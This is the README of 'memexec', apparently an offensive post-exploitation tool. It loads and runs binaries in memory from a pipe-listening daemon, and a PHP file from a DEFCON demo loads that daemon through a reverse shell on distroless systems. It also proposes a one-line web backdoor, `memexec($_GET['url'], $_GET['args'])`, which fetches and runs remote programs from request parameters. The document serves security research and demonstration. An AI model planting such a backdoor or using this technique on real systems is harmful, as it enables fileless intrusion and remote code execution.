# memexec

`memexecd.c` is the code for the "daemonized" [DDexec](https://github.com/arget13/DDexec). This program *listens* on a pipe for requests, which are composed of:
- Size of arguments.
- Arguments (separated by nullbytes).
- Size of program.
- Raw program.
After a request is received it `fork()`s and the child will load and run the program received, while keeping the parent as *server*.  
It should be fairly easy to adapt to other IPC methods instead of pipes, like sockets (UNIX or network ones), or shared memory.

`a.php` was part of the demo at DEFCON. In case you get an inverse php shell on a **distroless** --without write permissions anywhere-- you can paste the contents of this file in order to load the daemon. Then perform requests to load and run remote binaries using the function `memexec()` defined in `a.php`.

It can be very a very interesting toy to play with, *e. g.* in web environments where you can't get a reverse interactive session you may want to add code like `memexec($_GET['url'], $_GET['args'])`, or modify it in order to read the program from a POST request, and show the output of its execution as web content.

A probable next step would be to adapt the shellcode to use [memdlopen](https://github.com/arget13/memdlopen).

## TODO
* Detecting and dying gracefully when the loader needed by a program is not present on the system.
* Give the possibility of loading filelessly the loader too -in case it is not present.
* Also give the possibility of loading filelessly the libraries needed by the program -in case they are not present.
	* For this [memdlopen](https://github.com/arget13/memdlopen) is probably the way.
